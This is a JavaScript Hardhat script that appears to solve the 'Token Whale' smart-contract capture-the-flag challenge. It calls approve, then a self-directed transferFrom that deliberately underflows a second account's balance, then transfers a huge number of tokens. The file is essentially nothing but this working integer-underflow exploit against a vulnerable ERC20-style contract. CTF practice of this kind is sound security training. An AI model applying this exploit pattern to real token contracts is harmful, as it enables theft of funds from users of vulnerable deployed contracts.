const { url } = require('../../secrets.json');

// Using async in order to have the await functionality
(async () => {
	// Getting a signer
	const [signer1, signer2] = await hre.ethers.getSigners();

	// Deploy challenge contract
	const TokenWhaleChallenge = await ethers.getContractFactory("TokenWhaleChallenge");
	const tokenWhaleChallenge = await TokenWhaleChallenge.attach("0xcE691DCb8F2Fc1d7f264D8EeC63345918Dec9760");

	// approving a small spenditure to signer2
	await tokenWhaleChallenge.connect(signer1).approve(signer2.address, 1000, {
		gasLimit: 250000
	});

	// signer2 account should underflow and have a lot of tokens
	await tokenWhaleChallenge.connect(signer2).transferFrom(signer1.address, signer1.address, 1000, {
		gasLimit: 250000
	});

	// sending signer1 some of these tokens
	let tx = await tokenWhaleChallenge.connect(signer2).transfer(signer1.address, 10000000000, {
		gasLimit: 250000
	});
	
	console.log(tx);
})();
